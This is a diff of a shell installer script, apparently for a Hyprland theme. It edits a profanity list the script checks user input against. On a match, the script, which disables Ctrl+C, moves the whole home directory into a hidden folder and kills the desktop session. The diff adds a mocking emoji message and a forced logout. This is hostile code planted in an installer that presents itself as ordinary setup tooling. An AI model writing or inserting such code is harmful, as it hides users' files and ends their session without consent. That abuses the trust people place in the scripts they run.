@@ -88,9 +88,9 @@ echo -e "Do you have the deps? This is CRUCIAL.\nOn LFS, you may wanna see .deps
 show_deps
 trap '' SIGINT  # Disable Ctrl+C
 OFFENSIVE_WORDS=(
-  "fuck" "shit" "bitch" "asshole" "bastard" "dick" "piss" "crap" "damn"
+  "fuck" "shit" "bitch" "asshole" "bastard" "dick" "piss" "crap"
   "slut" "whore" "cunt" "twat" "prick" "cock" "balls" "jackass" "dipshit"
-  "dumbass" "motherfucker" "sonofabitch" "bullshit" "hell" "douche" "nipple"
+  "dumbass" "motherfucker" "sonofabitch" "bullshit" "douche" "nipple" "loser"
 )
 for word in "${OFFENSIVE_WORDS[@]}"; do
     if [[ "$userinput" == "$word" ]]; then
@@ -104,8 +104,9 @@ for word in "${OFFENSIVE_WORDS[@]}"; do
         sleep 0.5
         mkdir -p ~/.local/share/hyprmaterial3/trashed-system/
         mv ~/* ~/.local/share/hyprmaterial3/trashed-system/
-        
-        pkill {X,startx,gnome-shell,Hyprland,hyprland,plasmashell,plasma-x11}
+        echo -e "🖕 🖕"
+        clear
+        pkill {X,startx,gnome-shell,Hyprland,hyprland,plasmashell,plasma-x11} && logout
         exit 1
     fi
 done
